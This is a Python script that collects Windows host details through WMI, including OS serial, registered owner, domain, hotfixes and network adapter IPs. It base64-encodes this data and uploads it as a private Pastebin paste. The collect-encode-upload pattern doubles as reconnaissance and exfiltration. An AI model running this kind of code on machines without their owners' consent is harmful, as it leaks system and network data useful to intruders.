import platform
import os
import psutil
import socket
import wmi
import datetime
import requests
import base64


def get_system_info():
    c = wmi.WMI()
    os_info = c.Win32_OperatingSystem()[0]
    computer_system = c.Win32_ComputerSystem()[0]
    processor = c.Win32_Processor()[0]
    bios = c.Win32_BIOS()[0]
    timezone = datetime.datetime.now().astimezone().tzname()

    # Network Cards
    network_cards = c.Win32_NetworkAdapterConfiguration(IPEnabled=True)
    network_info = [
        {
            "Connection Name": net.Description,
            "IP Address(es)": net.IPAddress[0] if net.IPAddress else "N/A",
            "DHCP Enabled": net.DHCPEnabled,
            "DHCP Server": net.DHCPServer if net.DHCPEnabled else "N/A",
            "Status": getattr(net, "Status", "N/A")
        }
        for net in network_cards
    ]

    system_info = {
        "Host Name": socket.gethostname(),
        "Time Zone": timezone,
        "OS Name": os_info.Caption,
        "OS Version": os_info.Version,
        "OS Manufacturer": os_info.Manufacturer,
        "OS Configuration": os_info.BuildType,
        "OS Build Type": os_info.BuildNumber,
        "Product ID": os_info.SerialNumber,
        "Original Install Date": os_info.InstallDate.split('.')[0],
        "System Boot Time": os_info.LastBootUpTime.split('.')[0],
        "Registered Owner": os_info.RegisteredUser,
        "Registered Organization": os_info.Organization,
        "Windows Directory": os_info.WindowsDirectory,
        "System Directory": os_info.SystemDirectory,
        "Boot Device": os_info.BootDevice,
        "System Locale": os_info.Locale,
        "System Manufacturer": computer_system.Manufacturer,
        "System Model": computer_system.Model,
        "System Type": computer_system.SystemType,
        "Processor(s)": processor.Name,
        "BIOS Version": bios.SMBIOSBIOSVersion,
        "Total Physical Memory": f"{int(os_info.TotalVisibleMemorySize) // 1024} MB",
        "Available Physical Memory": f"{int(os_info.FreePhysicalMemory) // 1024} MB",
        "Virtual Memory: Max Size": f"{int(os_info.TotalVirtualMemorySize) // 1024} MB",
        "Virtual Memory: Available": f"{int(os_info.FreeVirtualMemory) // 1024} MB",
        "Virtual Memory: In Use": f"{(int(os_info.TotalVirtualMemorySize) - int(os_info.FreeVirtualMemory)) // 1024} MB",
        "Page File Location(s)": getattr(os_info, "PageFilePath", "N/A"),
        "Domain": computer_system.Domain,
        "Logon Server": os.getenv("LOGONSERVER", "N/A"),
        "Hyper-V Requirements": "Yes" if "hypervisor" in os_info.Caption.lower() else "No",
        "Hotfix(s)": [hotfix.HotFixID for hotfix in c.Win32_QuickFixEngineering()]
    }

    return system_info, network_info


def format_system_info(system_info, network_info):
    log_content = "=== SYSTEM INFORMATION ===\n"
    for key, value in system_info.items():
        log_content += f"{key}: {value}\n"

    log_content += "\n=== NETWORK INFORMATION ===\n"
    for net in network_info:
        log_content += "\n--- Network Adapter ---\n"
        for key, value in net.items():
            log_content += f"{key}: {value}\n"

    return log_content


def plain_paste(title, contents):
    username = "Username"  # Username akun Pastebin
    password = "Password"  # Password akun Pastebin
    api_dev_key = "API dev key"  # API dev key dari Pastebin

    login_url = "https://pastebin.com/api/api_login.php"
    login_data = {
        "api_dev_key": api_dev_key,
        "api_user_name": username,
        "api_user_password": password
    }

    # Login ke Pastebin untuk mendapatkan user key
    r = requests.post(login_url, data=login_data)
    api_user_key = r.text.strip()  # Hapus spasi atau newline

    if "Bad API request" in api_user_key:
        print(f"Login gagal: {api_user_key}")
        return

    # Encode isi log dengan base64 sebelum dikirim ke Pastebin
    encoded_contents = base64.b64encode(contents.encode('utf-8')).decode('utf-8')

    # Kirim log ke Pastebin sebagai paste baru
    paste_url = "https://pastebin.com/api/api_post.php"
    paste_data = {
        "api_paste_name": title,
        "api_paste_code": encoded_contents,
        "api_dev_key": api_dev_key,
        "api_user_key": api_user_key,
        "api_option": 'paste',
        "api_paste_private": 1,
    }

    r = requests.post(paste_url, data=paste_data)
    if r.status_code == 200:
        print(f"Log berhasil diupload ke Pastebin: {r.text}")
    else:
        print(f"Gagal mengupload log ke Pastebin: {r.status_code}")
    print(f"Response Code: {r.status_code}")
    print(f"Response Text: {r.text}")


if __name__ == "__main__":
    system_info, network_info = get_system_info()
    log_data = format_system_info(system_info, network_info)

    print("\n=== SYSTEM INFORMATION ===")
    print(log_data)

    # Upload hasil ke Pastebin
    plain_paste("System Info Log", log_data)


